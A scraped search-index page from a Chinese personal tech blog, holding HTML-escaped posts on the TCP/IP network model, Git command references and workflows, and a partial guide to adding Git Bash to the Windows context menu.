&lt;p&gt;知道&amp;quot;子网掩码&amp;quot;，我们就能判断，任意两个IP地址是否处在同一个子网络。方法是将两个IP地址与子网掩码分别进行AND运算（两个数位都为1，运算结果为1，否则为0），然后比较结果是否相同，如果是的话，就表明它们在同一个子网络中，否则就不是。&lt;/p&gt;
&lt;p&gt;比如，已知IP地址172.16.254.1和172.16.254.233的子网掩码都是255.255.255.0，请问它们是否在同一个子网络？两者与子网掩码分别进行AND运算，结果都是172.16.254.0，因此它们在同一个子网络。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IP数据包&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;根据IP协议发送的数据，就叫做IP数据包。不难想象，其中必定包括IP地址信息。&lt;/p&gt;
&lt;p&gt;IP数据包直接放进以太网数据包的&amp;quot;数据&amp;quot;部分&lt;/p&gt;
&lt;p&gt;具体来说，IP数据包也分为&amp;quot;标头&amp;quot;和&amp;quot;数据&amp;quot;两个部分。&lt;/p&gt;
&lt;p&gt;&amp;quot;标头&amp;quot;部分主要包括版本、长度、IP地址等信息，&amp;quot;数据&amp;quot;部分则是IP数据包的具体内容。&lt;/p&gt;
&lt;p&gt;IP数据包的&amp;quot;标头&amp;quot;部分的长度为20到60字节，整个数据包的总长度最大为65,535字节。因此，理论上，一个IP数据包的&amp;quot;数据&amp;quot;部分，最长为65,515字节。前面说过，以太网数据包的&amp;quot;数据&amp;quot;部分，最长只有1500字节。因此，如果IP数据包超过了1500字节，它就需要分割成几个以太网数据包，分开发送了。&lt;/p&gt;
&lt;h4 id=&#34;214传输层&#34;&gt;2.1.4传输层&lt;/h4&gt;
&lt;p&gt;&lt;u&gt;建立&amp;quot;端口到端口&amp;quot;的通信。&lt;/u&gt;&lt;/p&gt;
&lt;p&gt;有了MAC地址和IP地址，我们已经可以在互联网上任意两台主机上建立通信。&lt;/p&gt;
&lt;p&gt;接下来的问题是，同一台主机上有许多程序都需要用到网络，比如，你一边浏览网页，一边与朋友在线聊天。当一个数据包从互联网上发来的时候，你怎么知道，它是表示网页的内容，还是表示在线聊天的内容？&lt;/p&gt;
&lt;p&gt;也就是说，我们还需要一个参数，表示这个数据包到底供哪个程序（进程）使用。这个参数就叫做&amp;quot;端口&amp;quot;（port），它其实是每一个使用网卡的程序的编号。每个数据包都发到主机的特定端口，所以不同的程序就能取到自己所需要的数据。&lt;/p&gt;
&lt;p&gt;&amp;quot;端口&amp;quot;是0到65535之间的一个整数，正好16个二进制位。0到1023的端口被系统占用，用户只能选用大于1023的端口。不管是浏览网页还是在线聊天，应用程序会随机选用一个端口，然后与服务器的相应端口联系。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;UDP协议&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;现在，我们必须在数据包中加入端口信息，这就需要新的协议。最简单的实现叫做UDP协议，它的格式几乎就是在数据前面，加上端口号。&lt;/p&gt;
&lt;p&gt;UDP数据包，也是由&amp;quot;标头&amp;quot;和&amp;quot;数据&amp;quot;两部分组成。&lt;/p&gt;
&lt;p&gt;标头&amp;quot;部分主要定义了发出端口和接收端口，&amp;quot;数据&amp;quot;部分就是具体的内容。&lt;/p&gt;
&lt;p&gt;整个UDP数据包放入IP数据包的&amp;quot;数据&amp;quot;部分&lt;/p&gt;
&lt;p&gt;UDP数据包非常简单，&amp;quot;标头&amp;quot;部分一共只有8个字节，总长度不超过65,535字节，正好放进一个IP数据包。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TCP协议&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;UDP协议的优点是比较简单，容易实现，但是缺点是可靠性较差，一旦数据包发出，无法知道对方是否收到。&lt;/p&gt;
&lt;p&gt;为了解决这个问题，提高网络可靠性，TCP协议就诞生了。这个协议非常复杂，但可以近似认为，它就是有确认机制的UDP协议，每发出一个数据包都要求确认。如果有一个数据包遗失，就收不到确认，发出方就知道有必要重发这个数据包了。&lt;/p&gt;
&lt;p&gt;因此，TCP协议能够确保数据不会遗失。它的缺点是过程复杂、实现困难、消耗较多的资源。&lt;/p&gt;
&lt;p&gt;TCP数据包和UDP数据包一样，都是内嵌在IP数据包的&amp;quot;数据&amp;quot;部分。TCP数据包没有长度限制，理论上可以无限长，但是为了保证网络的效率，通常TCP数据包的长度不会超过IP数据包的长度，以确保单个TCP数据包不必再分割。&lt;/p&gt;
&lt;h4 id=&#34;215应用层&#34;&gt;2.1.5应用层&lt;/h4&gt;
&lt;p&gt;&lt;u&gt;规定应用程序的数据格式。&lt;/u&gt;&lt;/p&gt;
&lt;p&gt;应用程序收到&amp;quot;传输层&amp;quot;的数据，接下来就要进行解读。由于互联网是开放架构，数据来源五花八门，必须事先规定好格式，否则根本无法解读。&lt;/p&gt;
&lt;p&gt;举例来说，TCP协议可以为各种各样的程序传递数据，比如Email、WWW、FTP等等。那么，必须有不同协议规定电子邮件、网页、FTP数据的格式，这些应用程序协议就构成了&amp;quot;应用层&amp;quot;。&lt;/p&gt;
&lt;p&gt;这是最高的一层，直接面对用户。它的数据就放在TCP数据包的&amp;quot;数据&amp;quot;部分。&lt;/p&gt;
&lt;h2 id=&#34;3tcpip通信传输流&#34;&gt;3.TCP/IP通信传输流&lt;/h2&gt;
&lt;p&gt;利用 TCP/IP 协议族进行网络通信时，会通过分层顺序与对方进行通信。发送端从应用层往下走，接收端则往应用层往上走。&lt;/p&gt;
&lt;p&gt;我们用 HTTP 举例来说明，首先作为发送端的客户端在应用层（HTTP 协议）发出一个想看某个 Web 页面的 HTTP 请求。&lt;/p&gt;
&lt;p&gt;接着，为了传输方便，在传输层（TCP 协议）把从应用层处收到的数据（HTTP 请求报文）进行分割，并在各个报文上打上标记序号及端口号后转发给网络层。&lt;/p&gt;
&lt;p&gt;在网络层（IP 协议），增加作为通信目的地的 MAC 地址后转发给链路层。这样一来，发往网络的通信请求就准备齐全了。&lt;/p&gt;
&lt;p&gt;接收端的服务器在链路层接收到数据，按序往上层发送，一直到应用层。当传输到应用层，才能算真正接收到由客户端发送过来的 HTTP请求。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625528569737.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;发送端在层与层之间传输数据时，每经过一层时必定会被打上一个该层所属的首部信息。反之，接收端在层与层传输数据时，每经过一层时会把对应的首部消去。&lt;/p&gt;
&lt;p&gt;这种把数据信息包装起来的做法称为封装（encapsulate）。&lt;/p&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;阮一峰&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ruanyifeng.com/blog/2012/05/internet_protocol_suite_part_i.html&#34;&gt;互联网协议1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ruanyifeng.com/blog/2012/06/internet_protocol_suite_part_ii.html&#34;&gt;互联网协议2&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
">48-http-1-网络模型</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-ming-ling-zong-jie/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;命令加思维导图&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id=&#34;新建代码库&#34;&gt;新建代码库&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 在当前目录新建一个Git代码库
$ git init

# 新建一个目录，将其初始化为Git代码库
$ git init [project-name]

# 下载一个项目和它的整个代码历史
$ git clone [url]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;配置&#34;&gt;配置&lt;/h2&gt;
&lt;p&gt;Git的设置文件为&lt;code&gt;.gitconfig&lt;/code&gt;，它可以在用户主目录下，也可以在项目目录下。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 显示当前的Git配置
$ git config --list

# 编辑Git配置文件
$ git config -e [--global]

# 设置提交代码时的用户信息
$ git config [--global] user.name &amp;quot;[name]&amp;quot;
$ git config [--global] user.email &amp;quot;[email address]&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;增加删除文件&#34;&gt;增加/删除文件&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 添加指定文件到暂存区
$ git add [file1] [file2] ...

# 添加指定目录到暂存区，包括子目录
$ git add [dir]

# 添加当前目录的所有文件到暂存区
$ git add .

# 删除工作区文件，并且将这次删除放入暂存区
$ git rm [file1] [file2] ...

# 停止追踪指定文件，但该文件会保留在工作区
$ git rm --cached [file]

# 改名文件，并且将这个改名放入暂存区
$ git mv [file-original] [file-renamed]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;代码提交&#34;&gt;代码提交&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 提交暂存区到仓库区
$ git commit -m [message]

# 提交暂存区的指定文件到仓库区
$ git commit [file1] [file2] ... -m [message]

# 提交工作区自上次commit之后的变化，直接到仓库区
$ git commit -a

# 提交时显示所有diff信息
$ git commit -v

# 使用一次新的commit，替代上一次提交
# 如果代码没有任何新变化，则用来改写上一次commit的提交信息
$ git commit --amend -m [message]

# 重做上一次commit，并包括指定文件的新变化
$ git commit --amend &amp;lt;file1&amp;gt; &amp;lt;file2&amp;gt; ...
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;分支&#34;&gt;分支&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 列出所有本地分支
$ git branch

# 列出所有远程分支
$ git branch -r

# 列出所有本地分支和远程分支
$ git branch -a

# 新建一个分支，但依然停留在当前分支
$ git branch [branch-name]

# 新建一个分支，并切换到该分支
$ git checkout -b [branch]

# 新建一个分支，指向指定commit
$ git branch [branch] [commit]

# 新建一个分支，与指定的远程分支建立追踪关系
$ git branch --track [branch] [remote-branch]

# 切换到指定分支，并更新工作区
$ git checkout [branch-name]

# 建立追踪关系，在现有分支与指定的远程分支之间
$ git branch --set-upstream [branch] [remote-branch]

# 合并指定分支到当前分支
$ git merge [branch]

# 选择一个commit，合并进当前分支
$ git cherry-pick [commit]

# 删除分支
$ git branch -d [branch-name]

# 删除远程分支
$ git push origin --delete &amp;lt;branch-name&amp;gt;
$ git branch -dr &amp;lt;remote/branch&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;标签&#34;&gt;标签&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 列出所有tag
$ git tag

# 新建一个tag在当前commit
$ git tag [tag]

# 新建一个tag在指定commit
$ git tag [tag] [commit]

# 查看tag信息
$ git show [tag]

# 提交指定tag
$ git push [remote] [tag]

# 提交所有tag
$ git push [remote] --tags

# 新建一个分支，指向某个tag
$ git checkout -b [branch] [tag]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;查看信息&#34;&gt;查看信息&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 显示有变更的文件
$ git status

# 显示当前分支的版本历史
$ git log

# 显示commit历史，以及每次commit发生变更的文件
$ git log --stat

# 显示某个文件的版本历史，包括文件改名
$ git log --follow [file]
$ git whatchanged [file]

# 显示指定文件相关的每一次diff
$ git log -p [file]

# 显示指定文件是什么人在什么时间修改过
$ git blame [file]

# 显示暂存区和工作区的差异
$ git diff

# 显示暂存区和上一个commit的差异
$ git diff --cached [&amp;lt;file&amp;gt;]

# 显示工作区与当前分支最新commit之间的差异
$ git diff HEAD

# 显示两次提交之间的差异
$ git diff [first-branch]...[second-branch]

# 显示某次提交的元数据和内容变化
$ git show [commit]

# 显示某次提交发生变化的文件
$ git show --name-only [commit]

# 显示某次提交时，某个文件的内容
$ git show [commit]:[filename]

# 显示当前分支的最近几次提交
$ git reflog
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;远程同步&#34;&gt;远程同步&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 下载远程仓库的所有变动
$ git fetch [remote]

# 显示所有远程仓库
$ git remote -v

# 显示某个远程仓库的信息
$ git remote show [remote]

# 增加一个新的远程仓库，并命名
$ git remote add [shortname] [url]

# 取回远程仓库的变化，并与本地分支合并
$ git pull [remote] [branch]

# 上传本地指定分支到远程仓库
$ git push [remote] [branch]

# 强行推送当前分支到远程仓库，即使有冲突
$ git push [remote] --force

# 推送所有分支到远程仓库
$ git push [remote] --all
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;撤销&#34;&gt;撤销&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 恢复暂存区的指定文件到工作区
$ git checkout [file]

# 恢复某个commit的指定文件到工作区
$ git checkout [commit] [file]

# 恢复上一个commit的所有文件到工作区
$ git checkout .

# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变
$ git reset [file]

# 重置暂存区与工作区，与上一次commit保持一致
$ git reset --hard

# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变
$ git reset [commit]

# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致
$ git reset --hard [commit]

# 重置当前HEAD为指定commit，但保持暂存区和工作区不变
$ git reset --keep [commit]

# 新建一个commit，用来撤销指定commit
# 后者的所有变化都将被前者抵消，并且应用到当前分支
$ git revert [commit]
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;其他&#34;&gt;其他&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 生成一个可供发布的压缩包
# git archive
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625387910788.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;先抄一下阮老师的文章和腾讯的图&lt;/p&gt;
&lt;p&gt;以后有时间再整理&lt;/p&gt;
&lt;/blockquote&gt;
">47-git-42-命令总结</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-shi-yong-chang-jing/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;一些工作中会用到的知识点&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id=&#34;正常操作流程&#34;&gt;正常操作流程&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git add .
git commit -m &amp;quot;提交描述&amp;quot;
git pull
git push
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上述操作流程是经常会使用的操作，为什么pull之前要先提交commit？&lt;/p&gt;
&lt;p&gt;分两步理解&lt;/p&gt;
&lt;p&gt;第一步是&lt;code&gt;git add &amp;amp; git commit&lt;/code&gt;，这是你本地仓库的操作记录&lt;/p&gt;
&lt;p&gt;第二步是&lt;code&gt;git pull &amp;amp; git push&lt;/code&gt;，这是本地仓库和远程仓库的交互与同步。&lt;/p&gt;
&lt;p&gt;假如你本地没有修改文件，可以直接进行第二步，随时和远程仓库进行同步。&lt;/p&gt;
&lt;p&gt;假如你本地有修改文件，需要先将本地代码保存起来，做一次提交，这样在和远程交互的时候，才能对比操作。&lt;/p&gt;
&lt;p&gt;否则本地修改文件会被覆盖丢失。&lt;/p&gt;
&lt;h2 id=&#34;合并代码&#34;&gt;合并代码&lt;/h2&gt;
&lt;p&gt;当开发完成一个迭代后，需要发布上线，此时需要将dev分支的代码合并到master&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git switch master
git pull origin dev
git push
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;暂存代码&#34;&gt;暂存代码&lt;/h2&gt;
&lt;p&gt;当你需要去合并分支的时候，假如你dev分支上有未完成的工作，此时是不能切换分支的。&lt;/p&gt;
&lt;p&gt;但是因为工作还没有完成，你不想提交到远程，那么就可以将代码先暂存起来。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git stash

git switch master
git pull origin dev
git push

git switch dev
git stash pop
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;修复线上bug&#34;&gt;修复线上bug&lt;/h2&gt;
&lt;p&gt;此时已经发布上线了，但是发现线上有一个bug需要紧急处理，应该怎么做？&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;// 从master分支检出bugfix分支
git switch master
git switch -c bugfix
// 修复bug,提交到仓库
git add .
git commit -m &#39;fix bug x&#39;
// 切换到master,合并bugfix分支并删除
git switch master
git merge --no-ff -m &amp;quot;merged bugfix x&amp;quot; bugfix
git branch -d fixbug
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;假如你没有检出bug分支，直接在dev分支上开发的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;// 修复bug,提交到仓库
git add .
git commit -m &#39;fix bug x&#39;
// 拉取远程更新,并推送
git pull --rebase
git push
// 此时发现另外一名同事已经提交了一些东西，但是这些没经过验证不可以发到线上
// 查看提交记录，记录下你刚刚提交的commitId，假设为c0
git log --oneline
// 切换到master
git cherry-pick [刚刚提交的commitID]
git cherry-pick c0
// 提交
git pull
git push
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;版本回退&#34;&gt;版本回退&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;// 查看提交记录
git log --oneline
// 以上次提交举例HEAD~，实际以具体commitID
git reset --hard [commitid]
git reset --hard HEAD~
// 强行推送到远程
git push -f
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;切换工作区内容&#34;&gt;切换工作区内容&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git show-branch
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;// 指定快照
git restore --source [commitID] .
// 工作区切换到最新提交
git restore --source HEAD .
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;清空工作区内容&#34;&gt;清空工作区内容&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git restore --staged --worktree .
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;git命令行反应慢&#34;&gt;git命令行反应慢&lt;/h2&gt;
&lt;p&gt;1、删除本地无用的分支&lt;/p&gt;
&lt;p&gt;2、使用git log时，不要加&lt;code&gt;--graph&lt;/code&gt;参数&lt;/p&gt;
&lt;h2 id=&#34;调试某个功能并推送到dev环境&#34;&gt;调试某个功能并推送到dev环境&lt;/h2&gt;
&lt;p&gt;平时可能会遇到一些功能，在本地修改完成后，推送到dev环境去看效果，但是因为是调试，可能需要调试很多次，但是实际上并不应该推送很多无意义的提交。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;--amend&lt;/code&gt;撤销上次提交并推送本次提交,然后强制推送到远程&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git add .
git commit --amend -m &amp;quot;debug&amp;quot;
git push --force-with-lease
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;拷贝某次提交&#34;&gt;拷贝某次提交&lt;/h2&gt;
&lt;p&gt;你可能在本地新开了一个分支，做了一些实验性的东西，尝试解决某个需求，并且提交到了本地，这时有一个东西要修改，你忘记了当前是新开的test分支，而不是dev分支，直到修改完并提交成功才意识到提交错了分支。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git switch dev
git cherry-pick test
git pull
git push
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;对比差异&#34;&gt;对比差异&lt;/h2&gt;
&lt;p&gt;查看工作区与暂存区的差异&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看工作区与上一次commit之间的差异&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff HEAD
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看暂存区与当前 commit 的差异&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff --cached
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对比当前提交和上次提交&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff HEAD HEAD~
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对比具体文件file.txt&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff file.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对比分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git diff master dev
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;撤销某次提交&#34;&gt;撤销某次提交&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git revert &amp;lt;commitID&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当执行完&lt;code&gt;git revert &amp;lt;commitID&amp;gt;&lt;/code&gt;,会出现&lt;code&gt;vim&lt;/code&gt;编辑器页面，按&lt;code&gt;:q&lt;/code&gt;退出编辑，然后提交该commit&lt;/p&gt;
&lt;h2 id=&#34;打标签&#34;&gt;打标签&lt;/h2&gt;
&lt;p&gt;新增标签&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git tag v1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;推送标签&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push origin --tags
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;定位bug&#34;&gt;定位bug&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# 开始定位
git bisect start HEAD 4d83cf
# 功能正常
git bisect good
# 功能不正常
git bisect bad
# 退出定位
git bisect reset
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;删除分支&#34;&gt;删除分支&lt;/h2&gt;
&lt;p&gt;删除本地分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git branch -d [branch-name]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;删除远程分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git push origin --delete dev
&lt;/code&gt;&lt;/pre&gt;
">46-git-41-实用场景</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-clean/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git clean&lt;/code&gt;从你的工作区中删除所有没有 tracked，没有被管理过的文件。&lt;/p&gt;
&lt;p&gt;作用是让使工作区回到一个干净的状态(一个指定的commit状态)&lt;/p&gt;
&lt;p&gt;git clean 和 git reset --hard 结合使用。&lt;/p&gt;
&lt;p&gt;clean 影响没有被 track 过的文件（清除未被 add 或被 commit 的本地修改）&lt;/p&gt;
&lt;p&gt;reset 影响被 track 过的文件 （回退到上一个 commit）&lt;/p&gt;
&lt;p&gt;说到这里，我不禁想起了restore。两者结合不就是restore吗？&lt;/p&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;p&gt;查看可使用&lt;code&gt;git clean&lt;/code&gt;命令清除的文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git clean -n
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;删除当前目录下所有没有 track 过的文件&lt;/p&gt;
&lt;p&gt;不会删除 &lt;code&gt;.gitignore&lt;/code&gt; 文件里面指定的文件夹和文件, 不管这些文件有没有被 track 过&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git clean -f
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;删除指定路径下的没有被 track 过的文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git clean -f &amp;lt;path&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;删除当前目录下没有被 track 过的文件和文件夹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git clean -df
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;删除当前目录下所有没有 track 过的文件&lt;/p&gt;
&lt;p&gt;不管是否是 &lt;code&gt;.gitignore&lt;/code&gt;文件里面指定的文件夹和文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git clean -xf
&lt;/code&gt;&lt;/pre&gt;
">45-git-40-clean</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-show/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git show&lt;/code&gt;命令用于查看commit的内容&lt;/p&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# 输出某次提交的元数据和内容变化
$ git show [commit]
$ git show 12a86bc38 # By revision
$ git show v1.0.1 # By tag
$ git show feature132 # By branch name
$ git show 12a86bc38^ # Parent of a commit
$ git show 12a86bc38~2 # Grandparent of a commit
$ git show feature132@{yesterday} # Time relative
$ git show feature132@{2.hours.ago} # Time relative
&lt;/code&gt;&lt;/pre&gt;
">44-git-39-show</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-show-branch/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;查看分支及其历史提交记录&lt;/p&gt;
&lt;h2 id=&#34;命令&#34;&gt;命令&lt;/h2&gt;
&lt;p&gt;查看本地分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git show-branch
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看远程分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git show-branch -r
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看所有分支&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git show-branch -a
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;解析&#34;&gt;解析&lt;/h2&gt;
&lt;p&gt;1、输出分为上下两部分，使用若干个短划线&lt;code&gt;-&lt;/code&gt;分隔。两个分支使用两个短划线&lt;code&gt;--&lt;/code&gt;，三个分支使用三个短划线&lt;code&gt;---&lt;/code&gt;，依次类推。&lt;/p&gt;
&lt;p&gt;2、上半部分为层次缩进的分支列表，下半部分为commit列表。&lt;/p&gt;
&lt;p&gt;3、上半部分的分支列表中，使用&lt;code&gt;*&lt;/code&gt;标识当前分支，使用&lt;code&gt;!&lt;/code&gt;标识其他分支（不同的分支！标识颜色不一样）。&lt;/p&gt;
&lt;p&gt;分支前的标识符&lt;code&gt;*&lt;/code&gt;或者&lt;code&gt;!&lt;/code&gt;一直垂直贯通到下半部分，这一列完全相同的符号代表的commit都是属于这个分支的。&lt;/p&gt;
&lt;p&gt;4、下半部分的commit列表中，前导的符号有&lt;code&gt;*&lt;/code&gt;和&lt;code&gt;+&lt;/code&gt;号。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;*&lt;/code&gt;表示当前分支上有此commit。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;+&lt;/code&gt;表示此颜色代表的分支上有此commit。&lt;/p&gt;
&lt;p&gt;5、标识符的颜色只是用于容易区分列，一个分支一个颜色。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1625361802965.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">43-git-38-show-branch</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/git-shu-biao-you-jian-shou-dong-tian-jia-git-bash/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;鼠标右键没有git bash的解决办法&lt;/p&gt;
&lt;h2 id=&#34;操作&#34;&gt;操作&lt;/h2&gt;
&lt;p&gt;1、打开注册表&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;win+r&lt;/code&gt;,输入&lt;code&gt;regedit&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;2、找到shell目录&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;路径为：计算机\HKEY_CLASSES_ROOT\Directory\Background\shell&lt;/p&gt;
&lt;p&gt;如果Background目录下没有shell文件夹就新建shell文件夹。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;3、在shell目录上右键-新建-项，命名bash&lt;/p&gt;
&lt;p&gt;4、点击新建的Bash 右侧出现默认，点击默认，设置值为Open in Bash&lt;/p&gt;
&lt;p&gt;5、在bash目录上右键-新建-项，命名command&lt;/p&gt;
